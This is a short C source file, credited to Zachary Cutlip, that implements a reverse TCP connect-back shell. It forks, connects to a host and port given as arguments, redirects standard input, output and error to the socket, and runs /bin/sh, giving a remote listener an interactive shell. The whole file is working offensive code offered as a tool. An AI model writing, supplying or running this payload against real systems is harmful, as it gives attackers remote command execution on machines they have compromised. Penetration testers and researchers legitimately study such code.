// Copyright (c) 2015
// - Zachary Cutlip <uid000()gmail.com>
//
// See LICENSE for more details.


#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>

/*
 * Create reverse tcp connect-back shell.
 * ./reverse <IP address> <port>
 *      IP address  address of host to connect back to.
 *      port        port on host to connect back to.
 */

int do_rtcp(const char *host, const char *port)
{
    char *ex[4];
    int s;
    struct addrinfo hints;
    struct addrinfo *res;
    int ret;
    printf("do_rtcp()\n");
    memset(&hints, 0, sizeof hints);
    hints.ai_family=AF_INET;
    hints.ai_socktype=SOCK_STREAM;
    
    ret=getaddrinfo(host,port,&hints,&res);
    if (ret != 0)
    {
        fprintf(stderr,"getaddrinfo: %s\n", gai_strerror(ret));
        return 1;
    }
    s=socket(res->ai_family,res->ai_socktype,res->ai_protocol);
    
    if (s < 0)
    {
        perror("socket");
        return 1;
    }
    printf("ai_addrlen: %d\n",res->ai_addrlen);
    ret=connect(s,res->ai_addr,res->ai_addrlen);
    if (ret < 0)
    {
        perror("connect");
        return 1;
    }
    dup2(s,0);
    dup2(s,1);
    dup2(s,2);
    ex[0]="/bin/sh";
    ex[1]="sh";
    ex[2]=NULL;
    execve(ex[0],&ex[1],NULL);
    
    return 1;
}

int main(int argc, char **argv)
{
    const char *host;
    const char *port;
    pid_t child;
    
    if(argc != 3)
    {
        fprintf(stderr, "%s <IP address> <port>\n",argv[0]);
        exit(1);
    }
    
    printf("Forking.");
    child=fork();
    if(child)
    {
        printf("Child pid: %d\n",child);
        exit(EXIT_SUCCESS);  
    }else
    {
        printf("We have forked. Doing connect-back.\n");
        host=argv[1];
        port=argv[2];
        exit(do_rtcp(host,port)); 

    }

}

